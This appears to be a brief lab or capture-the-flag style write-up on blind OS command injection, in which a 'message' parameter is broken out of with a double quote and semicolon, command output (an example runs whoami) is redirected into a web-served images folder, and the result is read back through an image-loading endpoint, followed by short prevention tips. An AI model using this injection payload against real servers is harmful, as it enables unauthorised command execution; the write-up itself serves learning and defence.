Vulnerability:
	TThe server passes user input directly into a shell command without validating or sanitizing it,
	Allowing an attacker to inject commands and view the outputâ€”even if it's not reflected directly.
	
Exploit:
	Inject double quotes and a semicolon, add your command, redirect the output to a file, then access it using the image load endpoint:
		&message=mishmash";[PAYLOAD]+>+[PATH]/[FILE]"
	
Example:
	Inject:
		 ...
		 &message=mishmash";whoami+>+/var/www/images/my_command.txt"
		 
	Access:
		https://server.net/image?filename=my_command.txt
	
Prevention:
	- Disallow or escape double quotes and other special shell characters in input.
	- Restrict file loading to only valid image extensions.
